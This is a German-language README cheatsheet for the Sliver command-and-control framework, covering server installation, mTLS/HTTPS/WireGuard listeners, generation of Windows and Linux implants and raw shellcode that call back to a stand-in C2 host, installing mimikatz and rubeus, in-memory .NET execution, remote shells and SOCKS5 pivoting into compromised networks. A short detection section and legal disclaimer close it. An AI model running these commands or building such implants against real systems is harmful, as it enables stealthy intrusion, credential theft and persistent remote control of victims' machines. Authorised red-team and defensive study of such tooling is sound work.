<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Splitter C2 – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Rotes Team">
</p>

<p align="center">
  <b>⚔️ Modernes, plattformübergreifendes Open-Source-Angreiferemulations- und Command & Control-Framework, das die Protokolle mTLS, WireGuard, HTTP(S) und DNS unterstützt</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht & Architektur](#-overview--architecture)
- [Installation & Server-Setup](#-installation--server-setup)
  - [Automatisierte One-Liner-Installation](#automated-one-liner-install)
  - [Multiplayer-Operator-Konfiguration](#multiplayer-operator-configuration)
- [Listener-Konfiguration (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Implantate generieren (Beacons vs. Sitzungen)](#-generating-implants-beacons-vs-sessions)
  - [Interaktive Sitzungen vs. asynchrone Beacons](#interactive-sessions-vs-asynchronous-beacons)
  - [Windows EXE- und Shellcode-Implantate](#windows-exe--shellcode-implants)
  - [Linux- und macOS-ELF-Implantate](#linux--macos-elf-implants)
- [Post-Exploitation & Armory Ecosystem](#-post-exploitation--armory-ecosystem)
  - [Installieren von Armoury-Erweiterungen (BOFs, Donut, Sicherheitsgurt)](#installing-armory-extensions-bofs-donut-seatbelt)
  - [Anmeldeinformationszugriff und Mimikatz](#credential-access--mimikatz)
  - [Pivoting & Dynamic SOCKS5](#pivoting--dynamic-socks5)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht & Architektur

**Sliver** wurde von **Bishop Fox** in Go entwickelt und ist eine der führenden Open-Source-Alternativen zu kommerziellen C2-Frameworks (Cobalt Strike, Brute Ratel):
- **Plattformübergreifend:** Server und Implantate unterstützen Windows, Linux und macOS für `x86_64`, `arm64` und `arm`.
- **Umgehungskommunikation:** Sofort einsatzbereite Unterstützung für gegenseitiges TLS (mTLS), WireGuard UDP-Tunnel, HTTP/HTTPS mit prozeduraler Canary-Generierung und DNS-Tunneling.
- **In-Memory-Ausführung:** Native reflektierende DLL-Injektion, Beacon Object Files (BOFs), Inline-.NET-Ausführung über Donut und Process Hollowing.
- **Multiplayer-Architektur:** Echtzeit-Zusammenarbeit zwischen mehreren Red-Team-Operatoren über kryptografisch signierte Operatorprofile.

---

## 📥 Installation und Server-Setup

### Automatisierte One-Liner-Installation
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Multiplayer-Operator-Konfiguration
Erstellen Sie auf dem C2-Server ein Operatorprofil für ein Teammitglied:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Listener-Konfiguration (mTLS, HTTP, WireGuard, DNS)

In der `sliver`-Konsole:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Generieren von Implantaten (Beacons vs. Sitzungen)

### Interaktive Sitzungen vs. asynchrone Beacons
- **Sitzung:** Echtzeit-TCP/TLS-Verbindung mit sofortiger Befehlsantwort. Höhere Netzwerksichtbarkeit.
- **Beacon:** Asynchroner Heartbeat, der für Intervalle mit zufälligem Jitter schläft. Für SOCs ist es erheblich schwieriger, sie mithilfe einer Netzwerkanomalieanalyse zu identifizieren.

### Windows EXE- und Shellcode-Implantationen
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Linux- und macOS-ELF-Implantate
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Ökosystem nach Ausbeutung und Waffenkammer

### Installieren von Armory-Erweiterungen (BOFs, Donut, Sicherheitsgurt)
The Armory ist Slivers integrierter Paketmanager für Angriffstools und Cobalt Strike Beacon Object Files (BOFs) von Drittanbietern:
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Interaktion mit Sitzungen und Beacons
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### Pivot & Dynamic SOCKS5
Leiten Sie externe Angriffstools direkt in das kompromittierte Zielnetzwerk:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **mTLS-Listener starten** | `mtls --lport 8888` |
| **HTTPS-Listener starten** | `https --lport 443 --domain c2.domain.com` |
| **Sitzungs-EXE generieren** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Beacon EXE generieren** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Roh-Shellcode generieren** | `generate --mtls <IP>:8888 -f shellcode` |
| **Sitzungen auflisten und interagieren**| `sessions` -> `use <ID>` |
| **Armoury Tools installieren** | `armory install seatbelt mimikatz` |
| **In-Memory .NET-Ausführung**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 Reverse Proxy** | `socks5 start --port 1080` |

---

## 🛡️ Defensive Überlegungen und Erkennung

1. **JARM-Fingerprinting:** Standard-Sliver-HTTP-Listener können mit aktivem JARM-TLS-Fingerprinting profiliert werden. Passen Sie TLS-Verschlüsselungen in der Sliver-Konfiguration an.
2. **YARA und Binäranalyse:** Von `generate` erzeugte Standardimplantate enthalten Golang-Metadaten und Symbolstrukturen, sofern sie nicht durch Verstümmelung verschleiert werden (`--skip-symbols`).

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Sliver ist eine fortschrittliche Gegnersimulation und ein Red-Team-Command-&-Control-Framework. Es darf ausschließlich in autorisierten Einsätzen mit klaren Einsatzregeln (RoE) eingesetzt werden. Die unbefugte Nutzung auf Computern Dritter ist strengstens illegal.